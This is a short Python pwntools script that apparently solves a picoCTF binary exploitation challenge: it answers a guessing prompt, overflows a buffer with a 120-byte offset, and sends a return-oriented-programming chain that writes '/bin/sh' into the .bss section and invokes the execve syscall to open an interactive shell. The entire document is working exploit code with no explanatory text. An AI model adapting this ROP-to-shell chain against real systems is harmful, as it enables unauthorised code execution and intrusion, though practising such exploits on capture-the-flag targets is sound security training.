from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)

# io = process("./vuln")
io = remote("jupiter.challenges.picoctf.org", 26735)
io.recvuntil(b"What number would you like to guess?")
io.sendline(b"84")

io.recvuntil("Name?")
offset = 8 * 15
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]
mov_rsi_rax = 0x47FF91
binsh = b"/bin/sh\x00"

payload = b"a" * offset
payload += p64(pop_rax)
payload += binsh
payload += p64(pop_rsi)
payload += p64(elf.bss())
payload += p64(mov_rsi_rax)

payload += p64(pop_rdi)
payload += p64(elf.bss())
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(pop_rax)
payload += p64(0x3B)
payload += p64(syscall)

print(payload)
io.sendline(payload)
io.interactive()
